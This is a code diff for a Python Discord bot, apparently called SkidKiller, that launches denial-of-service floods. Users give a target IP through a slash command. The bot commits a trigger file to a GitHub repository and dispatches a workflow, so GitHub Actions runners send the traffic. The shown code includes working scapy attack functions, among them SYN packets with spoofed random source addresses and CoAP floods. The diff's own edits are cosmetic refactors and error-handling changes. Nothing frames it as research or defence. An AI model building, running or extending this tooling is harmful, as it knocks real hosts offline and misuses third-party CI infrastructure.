@@ -12,22 +12,27 @@ from datetime import datetime
 import requests
 from scapy.all import IP, TCP, UDP, Raw, send, RandShort
 
+# Load environment tokens
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
 GH_TOKEN = os.getenv("GH_TOKEN") or os.getenv("GITHUB_TOKEN")
 if not GH_TOKEN:
     sys.exit(1)
 
+# GitHub repo settings
 REPO_NAME = "KomaVR/SkidKiller"
 BRANCH = "main"
 CONFIG_FILE = "trigger.json"
 
-repo_client = Github(GH_TOKEN)
-repo = repo_client.get_repo(REPO_NAME)
+# Initialize GitHub client and HTTP session
+g = Github(GH_TOKEN)
+repo = g.get_repo(REPO_NAME)
 session = requests.Session()
 
+# Discord bot setup
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
+# List of attack method names
 working_methods = [
     "tcp_chained_syn", "ssl_fragment_flood", "websocket_spam", "jumbo_payload_overlap",
     "http_mutator", "json_object_injection", "illegal_tcp_flags", "fake_protocol_mix",
@@ -36,8 +41,7 @@ working_methods = [
     "malformed_http_headers", "tcp_option_abuse", "coap_flood"
 ]
 
-method_map = {name: globals()[name] for name in working_methods}
-
+# Attack implementations
 def tcp_chained_syn(ip, port=80):
     spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
     send(IP(src=spoof, dst=ip)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
@@ -130,6 +134,9 @@ def coap_flood(ip, port=5683):
     coap = bytes([0x40 | msg_type, code]) + msg_id + token
     send(IP(dst=ip)/UDP(dport=port)/Raw(load=coap + os.urandom(12)), verbose=0)
 
+# Map method names to functions after definitions
+method_map = {name: globals()[name] for name in working_methods}
+
 def runner_mode():
     cfg = json.load(open(CONFIG_FILE))
     func = method_map.get(cfg["method"])
@@ -139,7 +146,7 @@ def runner_mode():
     while time.time() < end_time:
         try:
             func(cfg["ip"])
-        except Exception:
+        except:
             pass
 
 @bot.event
@@ -170,6 +177,7 @@ async def attack(interaction: discord.Interaction, target_ip: str, method: app_c
         json.dump(config, f, indent=2)
     content = json.dumps(config, indent=2)
     try:
+        # update or create trigger.json
         try:
             contents = repo.get_contents(CONFIG_FILE, ref=BRANCH)
             repo.update_file(contents.path, "Update trigger.json", content, contents.sha, branch=BRANCH)
@@ -178,13 +186,15 @@ async def attack(interaction: discord.Interaction, target_ip: str, method: app_c
                 repo.create_file(CONFIG_FILE, "Create trigger.json", content, branch=BRANCH)
             else:
                 raise
+        # dispatch workflow
         workflow = repo.get_workflow("skidkiller.yml")
         workflow.create_dispatch(ref=BRANCH)
-        await interaction.response.send_message(
-            f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s) and dispatched workflow"
-        )
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)
+        await interaction.response.send_message(f"❌ Operation failed: {e}", ephemeral=True)
+        return
+    await interaction.response.send_message(
+        f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s) and dispatched workflow"
+    )
 
 @bot.tree.command(name="help", description="List methods")
 async def help_cmd(interaction: discord.Interaction):
@@ -198,7 +208,7 @@ async def status(interaction: discord.Interaction):
             f"IP: {cfg['ip']} | Method: {cfg['method']} | Threads: {cfg['threads']} | "
             f"Duration: {cfg['duration']}s | Time: {cfg['timestamp']}"
         )
-    except Exception:
+    except:
         msg = "No config"
     await interaction.response.send_message(msg, ephemeral=True)
 
